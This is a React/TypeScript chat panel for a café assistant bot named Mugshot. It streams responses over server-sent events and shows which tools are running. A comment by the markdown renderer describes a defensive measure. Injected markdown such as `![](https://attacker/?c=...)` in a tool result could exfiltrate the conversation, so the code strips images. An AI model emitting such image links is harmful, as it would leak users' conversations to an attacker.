"use client";

// The chat client: fetch-POST + SSE reader (EventSource can't POST), thinking dots,
// live tool chips, markdown answers. Ported from the previous project's React UI,
// trimmed to a single tenant.

import { useEffect, useRef, useState } from "react";
import ReactMarkdown from "react-markdown";

const SUGGESTIONS = [
  "What should I drink today?",
  "What food do you have?",
  "Do you deliver?",
  "What's new this season?",
];

const TOOL_LABELS: Record<string, string> = {
  get_weather: "Checking the weather",
  get_menu: "Checking the menu",
  get_specials: "Checking the specials",
};

interface ToolCall {
  label: string;
}

interface Turn {
  id: number;
  role: "user" | "assistant";
  text: string;
  tools: ToolCall[];
  phase: "thinking" | "answering" | "done" | "error";
  meta?: { latencyMs: number; inTokens: number; outTokens: number };
}

let nextId = 1;

export function ChatPanel() {
  const [turns, setTurns] = useState<Turn[]>([]);
  const [input, setInput] = useState("");
  const [busy, setBusy] = useState(false);
  const conversationRef = useRef<string | null>(null);
  const scrollRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    scrollRef.current?.scrollTo({ top: scrollRef.current.scrollHeight, behavior: "smooth" });
  }, [turns]);

  function patchLast(patch: (t: Turn) => Turn) {
    setTurns((prev) => {
      const next = [...prev];
      next[next.length - 1] = patch(next[next.length - 1]);
      return next;
    });
  }

  async function send(text: string) {
    const message = text.trim();
    if (!message || busy) return;

    setBusy(true);
    setInput("");
    setTurns((prev) => [
      ...prev,
      { id: nextId++, role: "user", text: message, tools: [], phase: "done" },
      { id: nextId++, role: "assistant", text: "", tools: [], phase: "thinking" },
    ]);

    try {
      const headers: Record<string, string> = { "Content-Type": "application/json" };
      const anonId = localStorage.getItem("michi.anonId");
      if (anonId) headers["X-Anon-Id"] = anonId;

      const response = await fetch("/api/chat", {
        method: "POST",
        headers,
        body: JSON.stringify({ message, conversationId: conversationRef.current }),
      });
      if (!response.ok || !response.body) throw new Error(`chat failed (${response.status})`);

      const reader = response.body.getReader();
      const decoder = new TextDecoder();
      let buffer = "";
      for (;;) {
        const { done, value } = await reader.read();
        if (done) break;
        buffer += decoder.decode(value, { stream: true });

        let sep;
        while ((sep = buffer.indexOf("\n\n")) >= 0) {
          const frame = buffer.slice(0, sep);
          buffer = buffer.slice(sep + 2);
          let eventType = "message";
          let data = "";
          for (const line of frame.split("\n")) {
            if (line.startsWith("event: ")) eventType = line.slice(7).trim();
            else if (line.startsWith("data: ")) data += line.slice(6);
          }
          if (!data) continue;
          const payload = JSON.parse(data);

          if (eventType === "tool") {
            patchLast((t) => ({
              ...t,
              tools: [...t.tools, { label: TOOL_LABELS[payload.name] ?? payload.name }],
            }));
          } else if (eventType === "delta") {
            patchLast((t) => ({ ...t, phase: "answering", text: t.text + payload.text }));
          } else if (eventType === "done") {
            conversationRef.current = payload.conversationId;
            localStorage.setItem("michi.anonId", payload.anonId);
            patchLast((t) => ({
              ...t,
              phase: "done",
              meta: { latencyMs: payload.latencyMs, ...payload.usage },
            }));
          } else if (eventType === "error") {
            patchLast((t) => ({ ...t, phase: "error", text: payload.message }));
          }
        }
      }
    } catch {
      patchLast((t) => ({
        ...t,
        phase: "error",
        text: "Could not reach the chat service. Is docker compose up?",
      }));
    } finally {
      setBusy(false);
    }
  }

  const empty = turns.length === 0;

  return (
    <div className="panel">
      <div className="messages" ref={scrollRef}>
        {empty && (
          <div className="empty">
            <div className="empty-mark" aria-hidden>
              ●
            </div>
            <h2>Chat with Mugshot</h2>
            <p>Ask about the menu, the weather, or what to try. Answers come from live data.</p>
            <div className="suggestions">
              {SUGGESTIONS.map((s) => (
                <button key={s} className="suggestion" onClick={() => void send(s)}>
                  {s}
                </button>
              ))}
            </div>
          </div>
        )}

        {turns.map((turn) =>
          turn.role === "user" ? (
            <div key={turn.id} className="row user">
              <div className="bubble user">{turn.text}</div>
            </div>
          ) : (
            <div key={turn.id} className="row bot">
              <div className="bot-block">
                {turn.tools.length > 0 && (
                  <div className="tool-chips">
                    {turn.tools.map((tool, i) => {
                      const running = turn.phase === "thinking" && i === turn.tools.length - 1;
                      return (
                        <span key={i} className={"tool-chip" + (running ? " running" : "")}>
                          {running ? (
                            <span className="spinner" aria-hidden />
                          ) : (
                            <span className="tick" aria-hidden>
                              ✓
                            </span>
                          )}
                          {tool.label}
                        </span>
                      );
                    })}
                  </div>
                )}
                {turn.phase === "thinking" && (
                  <div className="bubble bot thinking" aria-label="Michi is thinking">
                    <span className="dot" />
                    <span className="dot" />
                    <span className="dot" />
                  </div>
                )}
                {turn.phase === "error" && <div className="bubble bot error">{turn.text}</div>}
                {(turn.phase === "answering" || turn.phase === "done") && (
                  <div className="bubble bot">
                    <div className="md">
                      {/* skipHtml stops raw HTML, but NOT markdown images. An image is
                          fetched with no click, so `![](https://attacker/?c=...)` in a
                          tool result or persona would exfiltrate the conversation. The
                          bot has no reason to emit images, so drop them entirely. */}
                      <ReactMarkdown skipHtml disallowedElements={["img"]}>
                        {turn.text}
                      </ReactMarkdown>
                    </div>
                  </div>
                )}
                {turn.phase === "done" && turn.meta && (
                  <div className="meta">
                    {(turn.meta.latencyMs / 1000).toFixed(1)}s · {turn.meta.inTokens}→
                    {turn.meta.outTokens} tokens
                  </div>
                )}
              </div>
            </div>
          ),
        )}
      </div>

      <form
        className="composer"
        onSubmit={(e) => {
          e.preventDefault();
          void send(input);
        }}
      >
        <input
          value={input}
          onChange={(e) => setInput(e.target.value)}
          placeholder="Message Mugshot…"
          aria-label="Your message"
          disabled={busy}
          autoFocus
        />
        <button type="submit" disabled={busy || !input.trim()}>
          {busy ? "…" : "Send"}
        </button>
      </form>
    </div>
  );
}
